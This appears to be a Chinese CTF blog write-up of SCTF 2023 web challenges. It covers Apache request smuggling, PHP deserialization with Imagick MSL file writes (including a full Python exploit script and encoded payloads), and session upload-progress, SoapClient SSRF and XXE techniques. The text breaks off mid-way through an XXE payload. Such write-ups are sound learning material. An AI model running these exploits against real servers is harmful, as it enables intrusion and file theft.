{"title":"SCTF","uid":"78573adfdee442ddc082a9ef8f1c1600","slug":"SCTF","date":"2023-07-31T12:34:40.000Z","updated":"2023-09-04T15:09:56.428Z","comments":true,"path":"api/articles/SCTF.json","keywords":null,"cover":"/medias/cover.png","content":"<h1 id=\"SCTF-ezcheck1n\"><a href=\"#SCTF-ezcheck1n\" class=\"headerlink\" title=\"SCTF ezcheck1n\"></a>SCTF ezcheck1n</h1><h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><ul>\n<li>hint提示：find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server</li>\n<li>前端服务器的配置文件中有 two containers with an <strong>evil P</strong></li>\n</ul>\n<h2 id=\"Boogipop师傅的wp\"><a href=\"#Boogipop师傅的wp\" class=\"headerlink\" title=\"Boogipop师傅的wp\"></a><strong>Boogipop</strong>师傅的wp</h2><p><a href=\"https://xz.aliyun.com/t/12345\">CVE-2023-25690 Apache HTTP Server 请求走私漏洞 分析与利用 - 先知社区</a><br /><img src=\"/../SCTF/1.png\" alt=\"image.png\"><br />反向代理是一种代理模式，它充当Web服务器网关的代理服务器。当您将请求发送到使用反向代理的Web服务器时，他们将先转到反向代理，由该代理将确定是将其路由到哪个内部服务器。</p>\n<p><img src=\"/../SCTF/2.png\" alt=\"image.png\"></p>\n<ul>\n<li>将以 &#x2F;hello&#x2F; 开头的 URL 请求转发到 <code>http://10.122.255.252/index.php</code> 地址，并把hello之后的内容作为参数，作为name的值</li>\n</ul>\n<h1 id=\"SCTF-fumo-backdoor\"><a href=\"#SCTF-fumo-backdoor\" class=\"headerlink\" title=\"SCTF fumo_backdoor\"></a>SCTF fumo_backdoor</h1><h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p><img src=\"/../SCTF/3.png\" alt=\"image.png\"></p>\n<ul>\n<li>sleep函数： 如果路径存在文件，且路径不包括<code>flag</code>，会readfile</li>\n</ul>\n<p><img src=\"/../SCTF/4.png\" alt=\"image.png\"></p>\n<p><strong>Dockerfile 是用于构建 Docker 镜像的文本文件，其中包含了一系列指令和参数，用于描述如何构建镜像。</strong></p>\n<p><strong>Dockerfile 中的指令可以用于定义所需的基础镜像、安装依赖、添加文件、执行命令等操作，最终生成一个可运行的 Docker 镜像。</strong></p>\n<p><img src=\"/../SCTF/5.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里注意到安装了imagick扩展，于是就上Github上搜，但是我并没有搜到</li>\n</ul>\n<p><a href=\"https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md\">https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md</a><br /><img src=\"/../SCTF/6.png\" alt=\"image.png\"></p>\n<ul>\n<li>当对象被序列化时，会触发<code>sleep</code>，当对象反序列化时，会触发<code>wake up</code></li>\n<li><code>sleep</code>方法会读<code>flag</code>，但是这里有正则匹配，所以要把<code>flag</code>换个目录</li>\n<li><code>wakeip</code>方法中可以执行无参的命令</li>\n</ul>\n<p><strong>问题1：如何触发sleep</strong></p>\n<ul>\n<li><p><strong>当前情况下，只有</strong><code>**session**</code><strong>可以序列化</strong></p>\n</li>\n<li><p><strong>也就是如果我往session里写了东西，改了session，web框架检测到</strong><code>**session**</code><strong>修改，就会触发session的序列化，让他重新保存。</strong></p>\n<p>当你使用 PHP 中的 session 时，如果你往 session 中写入了数据，PHP 会将这些数据序列化为字符串，并将其存储在服务器上的某个位置（通常是文件系统上的某个位置，但也可以是其他位置，例如数据库中）。当客户端请求该 session 时，PHP 会将存储的字符串反序列化为原始数据</p>\n<p><strong>问题2：那怎么改session呢？</strong></p>\n</li>\n<li><p>参考上面的github，也就是我进到<code>wakeup</code>里面去，让他<code>new Imagick(&quot;vid:msl:/tmp/php*&quot;)</code>，现在可以执行<code>msl</code>脚本了</p>\n</li>\n</ul>\n<p><img src=\"/../SCTF/7.png\" alt=\"image.png\"><br /><strong>问题3：我怎么传一个</strong><code>**msl**</code><strong>脚本？</strong></p>\n<ul>\n<li>直接上传一个文件，在末尾添加脏数据，php会把上传的文件保存在<code>/tmp/phpxxxx</code>目录下</li>\n<li>用户的session保存在<code>/tmp</code>目录下，以<code>sess_(这部分是用户名)</code></li>\n</ul>\n<p><img src=\"/../SCTF/8.png\" alt=\"image.png\"></p>\n<ul>\n<li><read> 标签用于读取一个文件，它的 filename 属性指定了要读取的文件的路径和名称。在这个示例中，这个文件是一个 BASE64 编码的图片文件，它的数据被嵌入在一个 data URI 中，通过 inline: 协议来指定。</li>\n<li><write> 标签用于将处理后的图像写入到一个文件中，它的 filename 属性指定了要写入的文件的路径和名称。在这个示例中，这个文件的路径为 &#x2F;tmp&#x2F;sess_RABBIT。</li>\n<li>从这个 MSL 脚本来看，它的目的是读取一个图片文件，进行一些图像处理操作，然后将处理后的图片保存到<code>/tmp/sess_afkl</code>中</li>\n</ul>\n<p><strong>问题4：现在已经跑到sleep中了，但是不能直接读flag，咋办？</strong></p>\n<ul>\n<li>再执行一次<code>new imagick</code>，把<code>flag</code>换个地方</li>\n</ul>\n<p><img src=\"/../SCTF/9.png\" alt=\"image.png\"></p>\n<ul>\n<li>这里需要让<code>flag</code>通过图片校验，所以去找一个检查宽松的格式</li>\n</ul>\n<p><a href=\"https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html\">https://github.com/ImageMagick/ImageMagick/blob/main/www/formats.html</a>  </p>\n<ul>\n<li>此时我把<code>flag</code>读到了<code>/tmp/2333hhhh</code>目录下</li>\n<li>反序列化执行<code>wakeup</code>，用我的cookie<code>PHPSESSID=afkl</code>去读<code>flag</code></li>\n</ul>\n<h2 id=\"py脚本\"><a href=\"#py脚本\" class=\"headerlink\" title=\"py脚本\"></a>py脚本</h2><p>注意这里上传文件的格式</p>\n<ul>\n<li>和之前学的一样，value中包括两个元组，第一个是文件名，第二个是内容</li>\n<li>最后携带自己的cookie<code>PHPSESSID</code>去访问网站</li>\n</ul>\n<p><code>cookies=&#123;&quot;PHPSESSID&quot;: session_id&#125;)</code></p>\n<details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests<span class=\"token punctuation\">,</span> base64<span class=\"token punctuation\">,</span> time\nSERVER_ADDR <span class=\"token operator\">=</span> <span class=\"token string\">\"http://182.92.6.230:18080/\"</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">del_tempd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    resp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>SERVER_ADDR<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"rm\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">write_file</span><span class=\"token punctuation\">(</span>xml<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n<span class=\"token comment\"># Imagick(\"vid:msl:/tmp/php*\")</span>\n    unserialize <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">b'TzoxMzoiZnVtb19iYWNrZG9vciI6NDp7czo0OiJwYXRoIjtOO3M6NDoiYXJndiI7YToxOntpOjA7czoxNzoidmlkOm1zbDovdG1wL3BocCoiO31zOjQ6ImZ1bmMiO047czo1OiJjbGFzcyI7czo3OiJJbWFnaWNrIjt9'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>unserialize<span class=\"token punctuation\">)</span>\n    resp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>SERVER_ADDR<span class=\"token punctuation\">,</span>files<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec1.msl\"</span><span class=\"token punctuation\">,</span>xml<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>\n    <span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"unserialze\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"data\"</span><span class=\"token punctuation\">:</span>unserialize<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>status_code<span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">show_phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>SERVER_ADDR <span class=\"token operator\">+</span> <span class=\"token string\">\"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A7%3A%22phpinfo%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\"</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_new_php_session</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n    resp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>SERVER_ADDR <span class=\"token operator\">+</span> <span class=\"token string\">\"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A4%3A%7Bs%3A4%3A%22path%22%3BN%3Bs%3A4%3A%22argv%22%3Bs%3A14%3A%22vid%3Amsl%3A%2Ftmp%2Fa%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3Bs%3A5%3A%22class%22%3Bs%3A7%3A%22Imagick%22%3B%7D\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> resp<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"Set-Cookie\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token number\">42</span><span class=\"token punctuation\">]</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span>session_id<span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    resp <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>SERVER_ADDR <span class=\"token operator\">+</span> <span class=\"token string\">\"?cmd=unserialze&amp;data=O%3A13%3A%22fumo_backdoor%22%3A2%3A%7Bs%3A4%3A%22path%22%3Bs%3A8%3A%22%2Ftmp%2Fyyz%22%3Bs%3A4%3A%22func%22%3Bs%3A13%3A%22session_start%22%3B%7D\"</span><span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"PHPSESSID\"</span><span class=\"token punctuation\">:</span> session_id<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">)</span>\n\ndel_tempd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nsession_id <span class=\"token operator\">=</span> get_new_php_session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>session_id<span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\ndel_tempd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\nxml <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n &lt;read filename=\"mvg:/flag[20x20+20+20]\"!(\n!)image>\n&lt;write filename=\"mvg:/tmp/yyz\"!(\n!)group>\n'''</span></span>\nxml2 <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'''&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;group>\n&lt;image >\n&lt;read\nfilename=\"inline:data:text/8BIM;base64,eXl6fE86MTM6ImZ1bW9fYmFja2Rvb3IiOjI6e3M6NDoicGF0a\nCI7czo4OiIvdG1wL3l5eiI7czo0OiJmdW5jIjtzOjEzOiJzZXNzaW9uX3N0YXJ0Ijt9\"!(\n!)image>\n&lt;write filename=\"8BIM:/tmp/sess_</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>session_id<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"!(\n!)group>\n'''</span></span>\n\nwrite_file<span class=\"token punctuation\">(</span>xml<span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nwrite_file<span class=\"token punctuation\">(</span>xml2<span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\nsession_start<span class=\"token punctuation\">(</span>session_id<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<h1 id=\"SCTF-pypyp\"><a href=\"#SCTF-pypyp\" class=\"headerlink\" title=\"SCTF pypyp?\"></a>SCTF pypyp?</h1><h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"/../SCTF/10.png\" alt=\"image.png\"></h1><ul>\n<li>首先提示，session not started，也就是需要开启session</li>\n</ul>\n<h2 id=\"session-upload-progress开启session\"><a href=\"#session-upload-progress开启session\" class=\"headerlink\" title=\"session.upload_progress开启session\"></a>session.upload_progress开启session</h2><p><a href=\"https://blog.csdn.net/weixin_46330722/article/details/111657006\">文件包含骚姿势——利用session.upload_progress进行文件包含_noViC4的博客-CSDN博客</a></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">// 检查文件是否上传成功</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'文件上传失败：'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"aaaa\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://192.168.1.101/a.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">enctype</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>multipart/form-data<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>PHP_SESSION_UPLOAD_PROGRESS<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>file<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/../SCTF/11.png\" alt=\"image.png\"></p>\n<ul>\n<li>也就是我上传一个PHP_SESSION_UPLOAD_PROGRESS，同时带一个Cookie，就会让服务器开启session_start，创建一个session</li>\n</ul>\n<p><img src=\"/../SCTF/12.png\" alt=\"image.png\"><br /><img src=\"/../SCTF/13.png\" alt=\"image.png\"><br /><img src=\"/../SCTF/14.png\" alt=\"image.png\"></p>\n<ul>\n<li>这长度竟然不一样，前面是<code>----</code>,后面是<code>------</code></li>\n</ul>\n<p><img src=\"/../SCTF/15.png\" alt=\"image.png\"></p>\n<ul>\n<li><p>会认为后面这个是<code>post</code>上传的数据，key是<code>data</code></p>\n<p>在 HTTP 请求的消息体中，如果使用了 multipart&#x2F;form-data 格式，那么消息体中的每个部分都会使用 Content-Disposition 头来指定该部分的类型。如果部分是表单字段，那么 Content-Disposition 头的值通常为 form-data，并且会包含一个 name 属性来指定字段的名称。<br />在这个例子中，Content-Disposition 头的值为 form-data; name&#x3D;”data”，其中 name&#x3D;”data” 表示这是一个名为 data 的表单字段。<br /><strong>在 PHP 中，您可以通过访问 $_POST[‘data’] 来获取该字段的值。</strong></p>\n</li>\n</ul>\n<h2 id=\"php源码审计\"><a href=\"#php源码审计\" class=\"headerlink\" title=\"php源码审计\"></a>php源码审计</h2><details class=\"custom-details\">\n<summary>Click to see more</summary>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n    <span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Session not started'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$type</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$properties</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'properties'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">extract</span><span class=\"token punctuation\">(</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$object</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$object</span> <span class=\"token operator\">-></span> <span class=\"token function\">sctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$object</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$type</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$object</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'http://127.0.0.1:5000/'</span><span class=\"token operator\">.</span><span class=\"token variable\">$properties</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"this is the object: <span class=\"token interpolation\"><span class=\"token variable\">$object</span></span> &lt;br>\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n</p>\n</details>\n<ul>\n<li><p>这里首先<code>extract</code>可以控制变量，<code>$type</code>和<code>$properties</code>都可以控制</p>\n</li>\n<li><p>extract除了可以提取上传的参数，比如?properties&#x3D;aa，变成$properties&#x3D;aa</p>\n</li>\n<li><p>也可以提取数组，array(“properties” &#x3D;&gt; “aa”,”type” &#x3D;&gt; “bb”)，这个也会变成$properties&#x3D;aa，$type&#x3D;bb</p>\n</li>\n<li><p>$object -&gt; sctf()，但是这里显然是没有这个函数，因此可以想用<code>soapclient</code>进行ssrf</p>\n</li>\n<li><p>file_get_contents(‘<a href=\"http://127.0.0.1:5000/'.$properties\">http://127.0.0.1:5000/'.$properties)</a>)这个可以获取文件内容</p>\n</li>\n</ul>\n<ol>\n<li>首先题目提示查看<code>/app/app.py</code>,那就需要想办法查看源码。</li>\n</ol>\n<p><code>new $type($properties[0],$properties[1])</code>，这个参数可以自己控制</p>\n<h3 id=\"new-type-properties-0-properties-1\"><a href=\"#new-type-properties-0-properties-1\" class=\"headerlink\" title=\"new $type($properties[0],$properties[1])\"></a>new $type($properties[0],$properties[1])</h3><p>SimpleXMLElement：它可以实现xxe,xxe中用file协议读取文件，获得<code>app.py</code>的源码<br />SplFileObject：支持伪协议读取文件，也就是可以用php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;app&#x2F;app.py，或者file协议读取文件</p>\n<p><strong>SimpleXMLElement</strong></p>\n<ul>\n<li>用php的内置类SimpleXMLElement</li>\n</ul>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token variable\">$xml</span> <span class=\"token operator\">=</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">&lt;</span><span class=\"token constant\">EOD</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>xml version <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">ANY</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY f SYSTEM 